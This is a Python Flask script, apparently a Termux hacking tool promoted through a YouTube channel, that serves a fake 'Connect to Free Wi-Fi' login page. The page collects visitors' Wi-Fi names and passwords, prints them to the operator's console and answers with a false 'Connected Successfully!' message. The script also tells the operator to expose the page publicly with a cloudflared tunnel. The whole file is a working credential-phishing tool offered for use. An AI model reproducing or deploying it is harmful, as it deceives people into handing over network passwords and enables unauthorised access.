from flask import Flask, request, render_template_string
import os
import time

app = Flask(__name__)

# YouTube Redirect (works in Termux)
def redirect_to_youtube():
    print("\n\033[1;32m[!] This tool is not free!\033[0m")
    print("\033[1;33m[>] Redirecting to our YouTube channel in 10 seconds...\033[0m")
    time.sleep(10)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")

# WiFi Login Page HTML
login_page = '''
<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Login</title>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: monospace;
            text-align: center;
            padding-top: 100px;
        }
        input {
            padding: 10px;
            margin: 10px;
            width: 80%;
            font-size: 16px;
            border-radius: 5px;
            border: none;
        }
        button {
            padding: 10px 20px;
            background-color: crimson;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        .box {
            background-color: #222;
            padding: 30px;
            width: 300px;
            margin: auto;
            border-radius: 10px;
            box-shadow: 0px 0px 20px red;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Connect to Free Wi-Fi</h2>
        <form method="POST" action="/login">
            <input type="text" name="ssid" placeholder="Wi-Fi Name (SSID)" required><br>
            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def login():
    ssid = request.form.get('ssid')
    password = request.form.get('password')

    print(f"\n\033[1;36m[📶] SSID:\033[0m {ssid}")
    print(f"\033[1;31m[🔐] Password:\033[0m {password}\n")

    return '''
    <script>alert("Connected Successfully!");</script>
    <h2 style="color:white; background:black; padding:20px; text-align:center;">
    Thank you! Connecting to Wi-Fi...</h2>
    '''

if __name__ == '__main__':
    redirect_to_youtube()
    print("\033[1;32m[✔] Flask server running on http://127.0.0.1:5000\033[0m")
    print("\033[1;34m[>] Now run: cloudflared tunnel --url http://127.0.0.1:5000\033[0m\n")
    app.run(host='0.0.0.0', port=5000)
